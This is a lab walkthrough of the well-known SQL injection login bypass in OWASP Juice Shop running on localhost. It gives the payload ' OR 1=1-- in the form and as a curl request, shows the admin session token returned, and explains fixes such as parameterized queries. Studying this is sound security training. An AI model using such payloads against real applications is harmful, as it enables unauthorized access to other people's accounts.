# Walkthrough: SQL injection login bypass in Juice Shop

OWASP Juice Shop is the `juice-shop` target in this lab
(`http://127.0.0.1:8082`). This shows its best-known bug: logging in as the
administrator with no password, through SQL injection in the login form.

> Authorized-use-only. Juice Shop is intentionally vulnerable and bound to
> localhost. Never run these payloads against an application you do not own.

## Setup

```bash
labctl up
```

Open `http://127.0.0.1:8082` and go to **Account → Login**.

## 1. A normal login fails

The login form posts JSON to `/rest/user/login`. Wrong credentials are rejected:

```bash
curl -s -X POST http://127.0.0.1:8082/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"nobody@test.local","password":"wrong"}' \
  -o /dev/null -w '%{http_code}\n'
# 401
```

## 2. Inject in the email field

Server-side, the email is concatenated into a SQL query. Put this in the
**Email** field and any text in **Password**:

```
' OR 1=1--
```

The lookup becomes `... WHERE email = '' OR 1=1--' ...`, which matches every
user; the app logs you in as the **first** one — the administrator. The same
thing over the API:

```bash
curl -s -X POST http://127.0.0.1:8082/rest/user/login \
  -H 'Content-Type: application/json' \
  --data-binary '{"email":"'"'"' OR 1=1--","password":"anything"}'
```

The response carries a real session token for the admin account:

```json
{ "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUz...",
    "umail": "admin@juice-sh.op" } }
```

In the browser the same payload drops you onto the admin's account — order
history, saved data and all — without ever knowing a password.

## Why it works, and the fixes

| Weakness | Fix |
| --- | --- |
| Email concatenated into SQL | Use parameterized queries / the ORM's bound parameters so `' OR 1=1--` is treated as a literal email, not SQL. |
| "First matching row" logs you in | Authenticate a specific user and verify the password hash; never trust that a query returned exactly one intended row. |
| A bypass yields a full admin token | Defense in depth: separate admin auth, and alert on logins whose input contains SQL metacharacters. |

The injected string reaching the query is the whole bug. Bound parameters make
`' OR 1=1--` just an email address that matches nobody, and the login fails as
it should.

Every request above was run against the lab's own Juice Shop instance on localhost.
